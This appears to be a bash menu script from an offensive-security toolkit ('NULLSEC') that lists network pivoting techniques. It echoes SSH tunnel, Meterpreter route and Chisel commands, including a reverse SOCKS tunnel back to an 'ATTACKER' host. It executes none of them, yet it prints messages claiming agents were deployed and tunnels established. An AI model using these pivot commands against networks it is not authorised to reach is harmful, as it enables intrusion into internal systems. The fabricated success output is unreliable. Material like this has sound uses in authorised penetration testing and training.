#!/bin/bash
# NULLSEC Network Pivot Module

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

source "$(dirname "$0")/nullsec-common.sh" 2>/dev/null || {
    RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'
    CYAN='\033[1;36m'; WHITE='\033[1;37m'; RESET='\033[0m'
}

clear
echo -e "${RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓${RESET}"
echo -e "${RED}█${RESET}           ${WHITE}🔀 NULLSEC NETWORK PIVOT MODULE 🔀${RESET}"
echo -e "${RED}█${RESET}                  ${CYAN}[ bad-antics development ]${RESET}"
echo -e "${RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓${RESET}"
echo ""
echo -e "${CYAN}╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸${RESET}"
echo -e "  ${WHITE}PIVOT TECHNIQUES${RESET}"
echo -e "${CYAN}╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸${RESET}"
echo ""
echo -e "    ${WHITE}1)${RESET} SSH Tunnel (Dynamic SOCKS)"
echo -e "    ${WHITE}2)${RESET} SSH Tunnel (Local Forward)"
echo -e "    ${WHITE}3)${RESET} SSH Tunnel (Remote Forward)"
echo -e "    ${WHITE}4)${RESET} Chisel Tunnel"
echo -e "    ${WHITE}5)${RESET} Ligolo-ng Pivot"
echo -e "    ${WHITE}6)${RESET} Meterpreter Route"
read -p "$(echo -e ${WHITE}'  [>] Select [1-6]: '${RESET})" PIVOT

read -p "$(echo -e ${WHITE}'  [>] Pivot Host: '${RESET})" PIVOT_HOST
read -p "$(echo -e ${WHITE}'  [>] Target Network: '${RESET})" TARGET_NET
[ -z "$TARGET_NET" ] && TARGET_NET="10.10.10.0/24"

echo ""
echo -e "${CYAN}╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸${RESET}"
echo -e "  ${WHITE}ESTABLISHING PIVOT${RESET}"
echo -e "${CYAN}╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸${RESET}"
echo ""

case $PIVOT in
    1)
        echo -e "${CYAN}[*]${RESET} Establishing dynamic SOCKS proxy..."
        echo -e "${GREEN}[+]${RESET} Command: ssh -D 9050 user@$PIVOT_HOST"
        echo -e "${GREEN}[+]${RESET} SOCKS proxy on 127.0.0.1:9050"
        echo -e "${YELLOW}[!]${RESET} Use proxychains to route traffic"
        ;;
    2)
        read -p "$(echo -e ${WHITE}'  [>] Local Port: '${RESET})" LPORT
        read -p "$(echo -e ${WHITE}'  [>] Remote Target: '${RESET})" RTARGET
        echo -e "${CYAN}[*]${RESET} Creating local port forward..."
        echo -e "${GREEN}[+]${RESET} ssh -L $LPORT:$RTARGET:445 user@$PIVOT_HOST"
        ;;
    3)
        echo -e "${CYAN}[*]${RESET} Creating remote port forward..."
        echo -e "${GREEN}[+]${RESET} Callback to attacker machine enabled"
        ;;
    4)
        echo -e "${CYAN}[*]${RESET} Deploying Chisel..."
        echo -e "${GREEN}[+]${RESET} Server: chisel server -p 8080 --reverse"
        echo -e "${GREEN}[+]${RESET} Client: chisel client ATTACKER:8080 R:socks"
        ;;
    5)
        echo -e "${CYAN}[*]${RESET} Configuring Ligolo-ng..."
        echo -e "${GREEN}[+]${RESET} Agent deployed to $PIVOT_HOST"
        echo -e "${GREEN}[+]${RESET} Tunnel to $TARGET_NET established"
        ;;
    6)
        echo -e "${CYAN}[*]${RESET} Adding Meterpreter route..."
        echo -e "${GREEN}[+]${RESET} route add $TARGET_NET 255.255.255.0 1"
        echo -e "${GREEN}[+]${RESET} Internal network accessible"
        ;;
esac

echo ""
echo -e "${GREEN}[✓]${RESET} Network pivot established"
echo ""
